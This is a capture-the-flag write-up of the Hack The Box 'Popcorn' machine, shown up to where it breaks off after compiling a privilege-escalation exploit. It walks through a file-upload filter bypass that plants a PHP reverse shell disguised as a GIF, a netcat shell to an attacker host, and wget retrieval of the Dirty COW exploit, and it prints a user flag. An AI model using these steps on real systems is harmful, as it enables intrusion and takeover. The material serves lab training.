---
description: 10.10.10.6
---

# Popcorn

![](<../../.gitbook/assets/1 (5) (1).JPG>)

## Overview

The following exploits are covered for obtaining the flags on this target: ​

* User - There is a torrent hosting service which is vulnerable to file upload restriction bypass to get a reverse shell
* Root - Dirty Cow with EDB-ID: 40839

## Enumeration:

### Nmap

Let's begin with a basic nmap scan for all TCP ports:

```
└─$ nmap -p- 10.10.10.6  
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-16 06:26 EST
Nmap scan report for 10.10.10.6
Host is up (0.075s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 21.43 seconds

```

Now that we have a list of open ports, let's run a more targeted nmap scan:

```
└─$ sudo nmap -sS -sV --version-all -A -p 22,80 10.10.10.6 -n
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-16 06:28 EST
Nmap scan report for 10.10.10.6
Host is up (0.016s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.12 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.17 - 2.6.36 (95%), Linux 2.6.30 (95%), Linux 2.6.32 (95%), Linux 2.6.35 (95%), Linux 2.4.20 (Red Hat 7.2) (95%), Linux 2.6.17 (95%), AVM FRITZ!Box FON WLAN 7240 WAP (95%), Canon imageRUNNER ADVANCE C3320i or C3325 copier (94%), Android 2.3.5 (Linux 2.6) (94%), Epson WF-2660 printer (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   17.23 ms 10.10.14.1
2   17.35 ms 10.10.10.6

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.44 seconds

```

### Whatweb

Let's run whatweb against the target to see which technologies are being used for the webapp.

```
└─$ whatweb http://10.10.10.6   
http://10.10.10.6 [200 OK] Apache[2.2.12], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.12 (Ubuntu)], IP[10.10.10.6]

```

### Nikto

Let's run a Nikto scan against the target.

```
└─$ nikto -host http://10.10.10.6 -C all  
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.6
+ Target Hostname:    10.10.10.6
+ Target Port:        80
+ Start Time:         2021-11-16 06:29:31 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.2.12 (Ubuntu)
+ Server may leak inodes via ETags, header found with file /, inode: 43621, size: 177, mtime: Fri Mar 17 13:07:05 2017
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.2.12 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Retrieved x-powered-by header: PHP/5.2.10-2ubuntu6.10
+ /test: Output from the phpinfo() function was found.
+ OSVDB-112004: /test: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ OSVDB-112004: /test: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
+ /test.php: Output from the phpinfo() function was found.
+ /test/: Output from the phpinfo() function was found.
+ OSVDB-3092: /test/: This might be interesting...
+ /test/jsp/buffer1.jsp: Output from the phpinfo() function was found.
+ /test/jsp/buffer2.jsp: Output from the phpinfo() function was found.
+ /test/jsp/buffer3.jsp: Output from the phpinfo() function was found.
+ /test/jsp/buffer4.jsp: Output from the phpinfo() function was found.
+ /test/jsp/declaration/IntegerOverflow.jsp: Output from the phpinfo() function was found.
+ /test/jsp/extends1.jsp: Output from the phpinfo() function was found.
+ /test/jsp/extends2.jsp: Output from the phpinfo() function was found.
+ /test/jsp/Language.jsp: Output from the phpinfo() function was found.
+ /test/jsp/pageAutoFlush.jsp: Output from the phpinfo() function was found.
+ /test/jsp/pageDouble.jsp: Output from the phpinfo() function was found.
+ /test/jsp/pageExtends.jsp: Output from the phpinfo() function was found.
+ /test/jsp/pageImport2.jsp: Output from the phpinfo() function was found.
+ /test/jsp/pageInfo.jsp: Output from the phpinfo() function was found.
+ /test/jsp/pageInvalid.jsp: Output from the phpinfo() function was found.
+ /test/jsp/pageIsErrorPage.jsp: Output from the phpinfo() function was found.
+ /test/jsp/pageIsThreadSafe.jsp: Output from the phpinfo() function was found.
+ /test/jsp/pageSession.jsp: Output from the phpinfo() function was found.
+ /test/realPath.jsp: Output from the phpinfo() function was found.
+ OSVDB-3233: /test.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ /test/phpinfo.php: Output from the phpinfo() function was found.
+ OSVDB-3233: /test/phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ /test/phpinfo.php3: Output from the phpinfo() function was found.
+ OSVDB-3233: /test/phpinfo.php3: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ /test/test.php: Output from the phpinfo() function was found.
+ OSVDB-3233: /test/test.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ /test/info.php: Output from the phpinfo() function was found.
+ OSVDB-3233: /test/info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ /test/index.php: Output from the phpinfo() function was found.
+ OSVDB-3233: /test/index.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ /test/php_info.php: Output from the phpinfo() function was found.
+ OSVDB-3233: /test/php_info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /test.php: This might be interesting...
+ 26472 requests: 2 error(s) and 49 item(s) reported on remote host
+ End Time:           2021-11-16 06:39:31 (GMT-5) (600 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

### Gobuster

Let's run a gobuster scan against the target.

```
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.6 -q -k -x php,txt,xml
/index (Status: 200)
/test (Status: 200)
/test.php (Status: 200)
/torrent (Status: 301)
/rename (Status: 301)

```

### Dirb

```
└─$ dirb http://10.10.10.6                                                                              

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Nov 16 07:57:51 2021
URL_BASE: http://10.10.10.6/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.6/ ----
+ http://10.10.10.6/cgi-bin/ (CODE:403|SIZE:286)                                                                 
+ http://10.10.10.6/index (CODE:200|SIZE:177)                                                                    
+ http://10.10.10.6/index.html (CODE:200|SIZE:177)                                                               
+ http://10.10.10.6/server-status (CODE:403|SIZE:291)                                                            
+ http://10.10.10.6/test (CODE:200|SIZE:47328)                                                                   
==> DIRECTORY: http://10.10.10.6/torrent/                                                                        
                                                                                                                 
---- Entering directory: http://10.10.10.6/torrent/ ----
==> DIRECTORY: http://10.10.10.6/torrent/admin/                                                                  
+ http://10.10.10.6/torrent/browse (CODE:200|SIZE:9278)                                                          
+ http://10.10.10.6/torrent/comment (CODE:200|SIZE:936)                                                          
+ http://10.10.10.6/torrent/config (CODE:200|SIZE:0)                                                             
==> DIRECTORY: http://10.10.10.6/torrent/css/                                                                    
==> DIRECTORY: http://10.10.10.6/torrent/database/                                                               
+ http://10.10.10.6/torrent/download (CODE:200|SIZE:0)                                                           
+ http://10.10.10.6/torrent/edit (CODE:200|SIZE:0)                                                               
==> DIRECTORY: http://10.10.10.6/torrent/health/                                                                 
+ http://10.10.10.6/torrent/hide (CODE:200|SIZE:3765)                                                            
==> DIRECTORY: http://10.10.10.6/torrent/images/                                                                 
+ http://10.10.10.6/torrent/index (CODE:200|SIZE:11356)                                                          
+ http://10.10.10.6/torrent/index.php (CODE:200|SIZE:11356)                                                      
==> DIRECTORY: http://10.10.10.6/torrent/js/                                                                     
==> DIRECTORY: http://10.10.10.6/torrent/lib/                                                                    
+ http://10.10.10.6/torrent/login (CODE:200|SIZE:8367)                                                           
+ http://10.10.10.6/torrent/logout (CODE:200|SIZE:182)                                                           
+ http://10.10.10.6/torrent/preview (CODE:200|SIZE:28104)                                                        
==> DIRECTORY: http://10.10.10.6/torrent/readme/                                                                 
+ http://10.10.10.6/torrent/rss (CODE:200|SIZE:964)                                                              
+ http://10.10.10.6/torrent/secure (CODE:200|SIZE:4)                                                             
+ http://10.10.10.6/torrent/stylesheet (CODE:200|SIZE:321)                                                       
==> DIRECTORY: http://10.10.10.6/torrent/templates/                                                              
+ http://10.10.10.6/torrent/thumbnail (CODE:200|SIZE:1789)                                                       
==> DIRECTORY: http://10.10.10.6/torrent/torrents/                                                               
==> DIRECTORY: http://10.10.10.6/torrent/upload/                                                                 
+ http://10.10.10.6/torrent/upload_file (CODE:200|SIZE:0)                                                        
==> DIRECTORY: http://10.10.10.6/torrent/users/                                                                  
                                                                                                                 
---- Entering directory: http://10.10.10.6/torrent/admin/ ----
+ http://10.10.10.6/torrent/admin/admin (CODE:200|SIZE:2988)                                                     
+ http://10.10.10.6/torrent/admin/admin.php (CODE:200|SIZE:2988)                                                 
==> DIRECTORY: http://10.10.10.6/torrent/admin/images/                                                           
+ http://10.10.10.6/torrent/admin/index (CODE:200|SIZE:80)                                                       
+ http://10.10.10.6/torrent/admin/index.php (CODE:200|SIZE:80)                                                   
==> DIRECTORY: http://10.10.10.6/torrent/admin/templates/                                                        
+ http://10.10.10.6/torrent/admin/users (CODE:200|SIZE:80)                                                       
                                                                                                                 
---- Entering directory: http://10.10.10.6/torrent/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                 
---- Entering directory: http://10.10.10.6/torrent/database/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                 
---- Entering directory: http://10.10.10.6/torrent/health/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                 
---- Entering directory: http://10.10.10.6/torrent/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                 
---- Entering directory: http://10.10.10.6/torrent/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                 
---- Entering directory: http://10.10.10.6/torrent/lib/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                 
---- Entering directory: http://10.10.10.6/torrent/readme/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                 
---- Entering directory: http://10.10.10.6/torrent/templates/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                 
---- Entering directory: http://10.10.10.6/torrent/torrents/ ----
+ http://10.10.10.6/torrent/torrents/index (CODE:200|SIZE:0)                                                     
+ http://10.10.10.6/torrent/torrents/index.php (CODE:200|SIZE:0)                                                 
                                                                                                                 
---- Entering directory: http://10.10.10.6/torrent/upload/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                 
---- Entering directory: http://10.10.10.6/torrent/users/ ----
+ http://10.10.10.6/torrent/users/change_password (CODE:200|SIZE:80)                                             
+ http://10.10.10.6/torrent/users/forgot_password (CODE:200|SIZE:7913)                                           
+ http://10.10.10.6/torrent/users/img (CODE:200|SIZE:701)                                                        
+ http://10.10.10.6/torrent/users/index (CODE:200|SIZE:80)                                                       
+ http://10.10.10.6/torrent/users/index.php (CODE:200|SIZE:80)                                                   
+ http://10.10.10.6/torrent/users/registration (CODE:200|SIZE:8175)                                              
==> DIRECTORY: http://10.10.10.6/torrent/users/templates/                                                        
                                                                                                                 
---- Entering directory: http://10.10.10.6/torrent/admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                 
---- Entering directory: http://10.10.10.6/torrent/admin/templates/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                 
---- Entering directory: http://10.10.10.6/torrent/users/templates/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Tue Nov 16 08:03:57 2021
DOWNLOADED: 23060 - FOUND: 34
```

## Website exploration

​Review the source code for each page

Let's have a look at the page source and make a note of anything interesting:

* [http://10.10.10.6/torrent/torrents.php](http://10.10.10.6/torrent/torrents.php) - site powered by Torrent Hoster
  * We can register a user, login, upload a torrent file, edit an uploaded torrent file and upload an image file. We need to test these to see if we can upload PHP code.
* [http://10.10.10.6/torrent/upload/](http://10.10.10.6/torrent/upload/) - browsable directory of image files
* [http://10.10.10.6/torrent/database/](http://10.10.10.6/torrent/database/) - contains a downloadable .sql file
* [http://10.10.10.6/rename/](http://10.10.10.6/rename/) - text on the page states that files can be renamed using this api

#### Review the source code for any scripts that are being used on each page

Let's have a look at the scripts using the browser dev tools and make a note of anything interesting:

* Nothing found to be of interest

​There is alot to unpack here. Let's start by registering a user, logging in and looking around.

![](<../../.gitbook/assets/2 (3).JPG>)

Let's copy a PHP reverse shell script to our working directory and modify it with our IP and port.

One more thing we should do is to modify the reverse shell file to include the magic byte for GIF files. For more information about magic bytes, see the following page:

{% embed url="https://en.wikipedia.org/wiki/List_of_file_signatures" %}

```
└─$ head -5 rshell.php 
GIF87a
<?php

set_time_limit (0);
$VERSION = "1.0";

└─$ file rshell.php      
rshell.php.gif: GIF image data, version 87a, 15370 x 28735

```

Next, go to the upload page and attempt to upload the script, which we have named "rshell.php". We get an error message:&#x20;

![](<../../.gitbook/assets/3 (3).JPG>)

We try the following filenames to try and bypass the upload restrictions, however, none of them work:

> rshell.php.torrent
>
> rshell.torrent.php
>
> rshell.torrent.PhP
>
> rshell.torrent.pHtml
>
> rshell.torrent.php5
>
> rshell.torrent.phP7

## Gaining Access

Let's try and upload an actual torrent file. There are many places to get a torrent file, but for this we're going to use one from [https://ubuntu.com/download/alternative-downloads](https://ubuntu.com/download/alternative-downloads).&#x20;

[https://releases.ubuntu.com/18.04/ubuntu-18.04.6-desktop-amd64.iso.torrent](https://releases.ubuntu.com/18.04/ubuntu-18.04.6-desktop-amd64.iso.torrent)

Once the torrent file is downloaded, we can upload it to the target. Information is gathered from the torrent file and populated into a page which contains all the details of the target file.

![](<../../.gitbook/assets/4 (2).JPG>)

Scrolling down on this page, we find an option to edit the torrent. Clicking on the "Edit this torrent" button opens a new window:

![](<../../.gitbook/assets/5 (2).JPG>)

![](<../../.gitbook/assets/6 (2).JPG>)

Let's see if we can upload our PHP script here. We try the following, none of which works:

> rshell.php
>
> rshell.pHP7
>
> rshell.gif.php

Next, we try rshell.php.gif, and it works.

![](<../../.gitbook/assets/7 (2).JPG>)

Start a netcat listener, and refresh the torrent page.&#x20;

If we hover our mouse over the broken image link, we see the following: [http://10.10.10.6/torrent/upload/00b21cf92b5c30cff62a126154c23571979a4cab.gif](http://10.10.10.6/torrent/upload/00b21cf92b5c30cff62a126154c23571979a4cab.gif)

The server has stripped the "php" string right out of the filename. Let's see if we can rename it using the /rename api that gobuster found. There is a small problem though, which is that we don't know what the webroot is for the site.&#x20;

Generally, web services will be installed by default in /var/www or /var/www/html. We can try both. Since we can reach the files via the [http://10.10.10.6/torrent/upload/](http://10.10.10.6/torrent/upload/) page, let's try the following:

[http://10.10.10.6/rename/index.php?filename=/var/www/html/torrent/upload/00b21cf92b5c30cff62a126154c23571979a4cab.gif\&newfilename=/var/www/html/torrent/upload/](http://10.10.10.6/rename/index.php?filename=/var/www/html/torrent/upload/00b21cf92b5c30cff62a126154c23571979a4cab.gif\&newfilename=/var/www/html/torrent/upload/a.php)[00b21cf92b5c30cff62a126154c23571979a4cab](http://10.10.10.6/torrent/upload/00b21cf92b5c30cff62a126154c23571979a4cab.gif)[.php](http://10.10.10.6/rename/index.php?filename=/var/www/html/torrent/upload/00b21cf92b5c30cff62a126154c23571979a4cab.gif\&newfilename=/var/www/html/torrent/upload/a.php)

That didn't work. Let's try the following:

[http://10.10.10.6/rename/index.php?filename=/var/www/torrent/upload/00b21cf92b5c30cff62a126154c23571979a4cab.gif\&newfilename=/var/www/torrent/upload/](http://10.10.10.6/rename/index.php?filename=/var/www/torrent/upload/00b21cf92b5c30cff62a126154c23571979a4cab.gif\&newfilename=/var/www/torrent/upload/a.php)[00b21cf92b5c30cff62a126154c23571979a4cab](http://10.10.10.6/torrent/upload/00b21cf92b5c30cff62a126154c23571979a4cab.gif)[.php](http://10.10.10.6/rename/index.php?filename=/var/www/html/torrent/upload/00b21cf92b5c30cff62a126154c23571979a4cab.gif\&newfilename=/var/www/html/torrent/upload/a.php)

![](<../../.gitbook/assets/9 (1) (1).JPG>)

That seems to have worked. Let's check the [http://10.10.10.6/torrent/upload/](http://10.10.10.6/torrent/upload/?C=N;O=A) page:

![](<../../.gitbook/assets/10 (2).JPG>)

All we need to do now is make sure we have a netcat listener running before clicking on the 00b21cf92b5c30cff62a126154c23571979a4cab.php link to execute the reverse shell code in the script.&#x20;

```
└─$ nc -nvlp 8888                                                                                           130 ⨯
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.10.6.
Ncat: Connection from 10.10.10.6:52155.
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
 18:41:39 up 33 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
$ 
```

We find the /home/george directory, and we can read the user flag.

```
$ pwd
/
$ ls -la /home
total 12
drwxr-xr-x  3 root   root   4096 Mar 17  2017 .
drwxr-xr-x 21 root   root   4096 Nov 16 18:08 ..
drwxr-xr-x  3 george george 4096 Oct 26  2020 george
$ cd /home/george
$ ls -la
total 868
drwxr-xr-x 3 george george   4096 Oct 26  2020 .
drwxr-xr-x 3 root   root     4096 Mar 17  2017 ..
lrwxrwxrwx 1 george george      9 Oct 26  2020 .bash_history -> /dev/null
-rw-r--r-- 1 george george    220 Mar 17  2017 .bash_logout
-rw-r--r-- 1 george george   3180 Mar 17  2017 .bashrc
drwxr-xr-x 2 george george   4096 Mar 17  2017 .cache
-rw------- 1 root   root     1571 Mar 17  2017 .mysql_history
-rw------- 1 root   root       19 May  5  2017 .nano_history
-rw-r--r-- 1 george george    675 Mar 17  2017 .profile
-rw-r--r-- 1 george george      0 Mar 17  2017 .sudo_as_admin_successful
-rw-r--r-- 1 george george 848727 Mar 17  2017 torrenthoster.zip
-rw-r--r-- 1 george george     33 Nov 16 18:08 user.txt
$ cat user.txt
34d32dc6098993688b73868dc7d170f4
$ 
```

## Enumeration as "www-data"

Let's gather some basic system information:

```
www-data@popcorn:/$ uname -a;cat /etc/*-release;netstat -antp
uname -a;cat /etc/*-release;netstat -antp
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=9.10
DISTRIB_CODENAME=karmic
DISTRIB_DESCRIPTION="Ubuntu 9.10"
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 10.10.10.6:80           10.10.14.7:33180        ESTABLISHED -               
tcp        0      0 10.10.10.6:52155        10.10.14.7:8888         ESTABLISHED 1799/sh         
tcp6       0      0 :::22                   :::*                    LISTEN      -               
www-data@popcorn:/$
```

This system is running a very old kernel version from 2009. Let's check it with the linux exploit suggester script:

{% embed url="https://github.com/mzet-/linux-exploit-suggester" %}

```
└─$ ~/Desktop/share/Software/linux-exploit-suggester/linux-exploit-suggester.sh -u 'Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux'

Available information:

Kernel version: 2.6.31
Architecture: i686
Distribution: ubuntu
Distribution version: N/A
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): N/A
Package listing: N/A

Searching among:

78 kernel space exploits
0 user space exploits

Possible Exploits:

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2012-0056,CVE-2010-3849,CVE-2010-3850] full-nelson

   Details: http://vulnfactory.org/exploits/full-nelson.c
   Exposure: probable
   Tags: [ ubuntu=(9.10|10.10){kernel:2.6.(31|35)-(14|19)-(server|generic)} ],ubuntu=10.04{kernel:2.6.32-(21|24)-server}
   Download URL: http://vulnfactory.org/exploits/full-nelson.c

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: less probable
   Tags: ubuntu=(14.04|16.04){kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2010-3904] rds

   Details: http://www.securityfocus.com/archive/1/514379
   Exposure: less probable
   Tags: debian=6.0{kernel:2.6.(31|32|34|35)-(1|trunk)-amd64},ubuntu=10.10|9.10,fedora=13{kernel:2.6.33.3-85.fc13.i686.PAE},ubuntu=10.04{kernel:2.6.32-(21|24)-generic}
   Download URL: http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c

[+] [CVE-2010-3848,CVE-2010-3850,CVE-2010-4073] half_nelson

   Details: https://www.exploit-db.com/exploits/17787/
   Exposure: less probable
   Tags: ubuntu=(10.04|9.10){kernel:2.6.(31|32)-(14|21)-server}
   Download URL: https://www.exploit-db.com/download/17787

[+] [CVE-2010-3437] pktcdvd

   Details: https://www.exploit-db.com/exploits/15150/
   Exposure: less probable
   Tags: ubuntu=10.04
   Download URL: https://www.exploit-db.com/download/15150

[+] [CVE-2010-3301] ptrace_kmod2

   Details: https://www.exploit-db.com/exploits/15023/
   Exposure: less probable
   Tags: debian=6.0{kernel:2.6.(32|33|34|35)-(1|2|trunk)-amd64},ubuntu=(10.04|10.10){kernel:2.6.(32|35)-(19|21|24)-server}
   Download URL: https://www.exploit-db.com/download/15023

[+] [CVE-2010-2959] can_bcm

   Details: https://www.exploit-db.com/exploits/14814/
   Exposure: less probable
   Tags: ubuntu=10.04{kernel:2.6.32-24-generic}
   Download URL: https://www.exploit-db.com/download/14814

[+] [CVE-2010-1146] reiserfs

   Details: https://jon.oberheide.org/blog/2010/04/10/reiserfs-reiserfs_priv-vulnerability/
   Exposure: less probable
   Tags: ubuntu=9.10
   Download URL: https://jon.oberheide.org/files/team-edward.py

[+] [CVE-2021-27365] linux-iscsi

   Details: https://blog.grimm-co.com/2021/03/new-old-bugs-in-linux-kernel.html
   Exposure: less probable
   Tags: RHEL=8
   Download URL: https://codeload.github.com/grimm-co/NotQuite0DayFriday/zip/trunk
   Comments: CONFIG_SLAB_FREELIST_HARDENED must not be enabled

[+] [CVE-2014-0196] rawmodePTY

   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/33516

[+] [CVE-2013-0268] msr

   Details: https://www.exploit-db.com/exploits/27297/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/27297

[+] [CVE-2010-4347] american-sign-language

   Details: https://www.exploit-db.com/exploits/15774/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/15774

[+] [CVE-2010-3081] video4linux

   Details: https://www.exploit-db.com/exploits/15024/
   Exposure: less probable
   Tags: RHEL=5
   Download URL: https://www.exploit-db.com/download/15024

[+] [CVE-2009-3547] pipe.c 3

   Details: https://www.exploit-db.com/exploits/10018/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/10018

[+] [CVE-2009-3547] pipe.c 2

   Details: https://www.exploit-db.com/exploits/33322/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/33322

[+] [CVE-2009-3547] pipe.c 1

   Details: https://www.exploit-db.com/exploits/33321/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/33321

```

Looks like it's vulnerable to Dirty COW.

```
└─$ searchsploit 'Linux Kernel Dirty COW'    
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (1)          | linux/dos/43199.c
Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (2)          | linux/dos/44305.c
Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition | linux/local/40616.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege | linux/local/40847.cpp
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condition (Write A | linux/local/40838.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privil | linux/local/40839.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self/mem Race Condition (Write Ac | linux/local/40611.c
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

## Privilege Escalation

Let's download 40839.c to our working directory, start a python web server and transfer it to the target using wget.

```
www-data@popcorn:/dev/shm$ wget 10.10.14.7:8000/40839.c
wget 10.10.14.7:8000/40839.c
--2021-11-16 19:22:31--  http://10.10.14.7:8000/40839.c
Connecting to 10.10.14.7:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4814 (4.7K) [text/x-csrc]
Saving to: `40839.c'

100%[======================================>] 4,814       --.-K/s   in 0.005s  

2021-11-16 19:22:31 (963 KB/s) - `40839.c' saved [4814/4814]

www-data@popcorn:/dev/shm$ ls -l
ls -l
total 480
-rw-rw-rw- 1 www-data www-data   4814 Nov 16 19:18 40839.c
www-data@popcorn:/dev/shm$
```

Next, we need to compile it and execute the binary:

```
www-data@popcorn:/dev/shm$ gcc -pthread 40839.c -o cow -lcrypt
gcc -pthread 40839.c -o cow -lcrypt
www-data@popcorn:/dev/shm$ ls -la
ls -la
total 496
drwxrwxrwt  2 root     root        100 Nov 16 19:23 .
drwxr-xr-x 14 root     root       3320 Nov 16 18:08 ..
-rw-rw-rw-  1 www-data www-data   4814 Nov 16 19:18 40839.c
